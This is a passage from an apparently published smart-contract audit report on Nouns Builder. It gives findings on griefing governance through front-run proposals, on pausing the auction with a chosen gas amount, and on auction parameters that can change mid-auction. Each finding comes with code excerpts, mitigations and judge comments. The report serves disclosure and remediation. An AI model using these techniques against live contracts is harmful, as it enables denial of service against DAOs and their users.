prevented again due to the aforementioned issue).</p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L151\">governance/governor/Governor.propose</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">propose</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_targets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_values</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_calldatas</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_description</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    [..]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Compute the description hash</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">descriptionHash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_description</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Compute the proposal id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">hashProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk12\">descriptionHash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Get the pointer to store the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Ensure the proposal doesn&#39;t already exist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">voteStart</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PROPOSAL_EXISTS</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// @audit-info Reverts in case the proposals with the same data exists already</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    [..]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L353-L377\">governance/governor/Governor.cancel</a></p>\n<p>Cancelling a proposal updates the <code>proposal.canceled</code> boolean property to <code>true</code>. <code>proposal.voteStart</code> is left unchanged (<code>!= 0</code>).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Cancels a proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _proposalId The proposal id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">cancel</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Ensure the proposal hasn&#39;t been executed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">state</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Executed</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PROPOSAL_ALREADY_EXECUTED</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Get a copy of the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Cannot realistically underflow and `getVotes` would revert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure the caller is the proposer or the proposer&#39;s voting weight has dropped below the proposal threshold</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposer</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk11\">getVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) &gt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proposalThreshold</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">INVALID_CANCEL</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Update the proposal as canceled</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">canceled</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// If the proposal was queued:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isQueued</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Cancel the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">cancel</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ProposalCanceled</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended mitigation steps</h3>\n<p>Consider adding a per-account nonce storage variable (e.g. <code>mapping(address => uint256) internal proposalCreatorNonces;</code> to the <code>Governor</code> contract and include the <code>proposalCreatorNonces[msg.sender]++</code> nonce within the computed proposal id.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182#issuecomment-1257328207\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, a motivated attacker can consistently grief the DAO with multiple spam proposals, that front-run the “official” ones, with the goal of cancelling them and preventing them to go through.</p>\n<p>This exploit can be performed as long as the attacker has sufficient balance to be a <code>Proposer</code>.</p>\n<p>The only saving grace from this finding being a High Severity is that there are ways to avoid the front-running.</p>\n<p>Specifically a proposer could:</p>\n<ul>\n<li>Use a private relayer</li>\n<li>Ask a miner / proposer to mine the tx</li>\n</ul>\n<p>Additionally, the Proposer could use a contract, which would loop through proposals, by using a source of randomness to try a bunch of new proposals.</p>\n<p>Because checking if a proposal exists is cheaper than writing it (2.1k vs 20k to write in a storage slot), the write can eventually come up with one proposal the attacker didn’t perform.</p>\n<p>However the remediation requires a new contract, not available at this time.</p>\n<p>The reason why this remediation is possible is that the <code>_description</code> parameter is used to uniquely identify a proposal, this allows to create gibberish strings until we get one that goes through.</p>\n<p>Because the attack is:</p>\n<ul>\n<li>Possible</li>\n<li>Easy to implement<br>\nBut can be sidestepped, via a fairly complicated process</li>\n</ul>\n<p>I think Medium Severity to be appropriate.</p>\n<p>Remediation would be to add the proposer address as part of the proposal id identifier.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182\">kulkarohan (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-15-malicious-pausing-the-contract\" style=\"position:relative;\"><a href=\"#m-15-malicious-pausing-the-contract\" aria-label=\"m 15 malicious pausing the contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719\">[M-15] Malicious pausing the contract</a></h2>\n<p><em>Submitted by V_B</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L204\">Auction.sol#L204</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L206\">Auction.sol#L206</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L235\">Auction.sol#L235</a><br></p>\n<p>There is a function <code>_createAuction</code> in <code>Auction</code> contract.</p>\n<p>It consists of the following logic:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">/// @dev Creates an auction for the next token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function _createAuction() private {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Get the next token available for bidding</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    try token.mint() returns (uint256 tokenId) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        **creating of the auction for token with id equal to tokenId**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Pause the contract if token minting failed</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } catch Error(string memory) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _pause();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>According to the <a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md\">EIP-150</a> <code>call</code> opcode can consume as most <code>63/64</code> of parrent calls’ gas. That means <code>token.mint()</code> can fail since there will be no gas.</p>\n<p>All in all, if <code>token.mint()</code> fail on gas and the rest gas is enough for pausing the contract by calling <code>_pause</code> in <code>catch</code> statement the contract will be paused.</p>\n<p>Please note, that a bug can be exploitable if the token.mint() consume more than 1.500.000 of gas, because 1.500.000 / 64 > 20.000 that need to pause the contract. Also, the logic of <code>token.mint()</code> includes traversing the array up to 100 times, that’s heavy enough to reach 1.500.000 gas limit.</p>\n<h3 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Contract can be paused by any user by passing special amount of gas for the call of <code>settleCurrentAndCreateNewAuction</code> (which consists of two internal calls of <code>_settleAuction</code> and <code>_createAuction</code> functions).</p>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add a special check for upper bound of <code>gasLeft</code> at start of <code>_createAuction</code> function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719#issuecomment-1251653736\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Honestly I’m really impressed by the submission, however I think the quote:</p>\n<p><code>Please note, that a bug can be exploitable if the token.mint() consume more than 1.500.000 of gas, because 1.500.000 / 64 > 20.000 that need to pause the contract. Also, the logic of token.mint() includes traversing the array up to 100 times, that's heavy enough to reach 1.500.000 gas limit.</code><br>\nshows that the likelihood of this happening is extremely small, the base mint will cost between 20k and 40k gas, and each instance of the loop should roughly cost 5k, with the minting instance costing around 5k + up to 50k</p>\n<p>From basic napkin math this is actually surprisingly possible<br>\n<img width=\"721\" alt=\"Screenshot 2022-09-20 at 00 56 54\" src=\"https://user-images.githubusercontent.com/13383782/191133542-1a17c58b-2cf1-4eb4-a0c8-36b5546aa62c.png\"></p>\n<p>However I believe the odds of this happening are extremely low as you’d need to have at least 20 tokens being minted to founders<br>\n<img width=\"795\" alt=\"Screenshot 2022-09-20 at 00 58 15\" src=\"https://user-images.githubusercontent.com/13383782/191133675-9b226a11-b391-4d7a-a9a6-beaed8cd88b3.png\"></p>\n<p>I think Med is more appropriate for now, I really like the catch of the OOG exploit, however I may have to downgrade further as the worst case scenario being pausing is not impactful.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719#issuecomment-1257329224\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I believe the finding to be valid and Medium Severity as the conditions are non-trivial, but the impact is Denial of Service which can be triggered predictably given the circumnstances.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/719\">iainnash (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-16-auction-parameters-can-be-changed-during-ongoing-auction\" style=\"position:relative;\"><a href=\"#m-16-auction-parameters-can-be-changed-during-ongoing-auction\" aria-label=\"m 16 auction parameters can be changed during ongoing auction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/450\">[M-16] Auction parameters can be changed during ongoing auction</a></h2>\n<p><em>Submitted by __141345__, also found by pauliax, rbserver, rvierdiiev, and sorrynotsorry</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L307-L335\">Auction.sol#L307-L335</a><br></p>\n<p>The auction parameters can be changed anytime, even during ongoing auctions, and take effect immediately. Users may need time to react to the changes. The impacts maybe followings:</p>\n<ul>\n<li>some sudden changes may cause bidder’s transaction fail, such as <code>setReservePrice()</code> and <code>setMinimumBidIncrement()</code></li>\n<li>some changes may change users expectation about the auction, such as <code>setDuration()</code> and <code>setTimeBuffer()</code>, with different time parameters, bidders will use different strategy</li>\n</ul>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>src/auction/Auction.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"61\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setDuration</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_duration</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint40</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DurationUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setReservePrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_reservePrice</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">reservePrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_reservePrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReservePriceUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_reservePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setTimeBuffer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_timeBuffer</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timeBuffer</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint40</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_timeBuffer</span><span class=\"mtk1\">);</span></span></span>\n<span 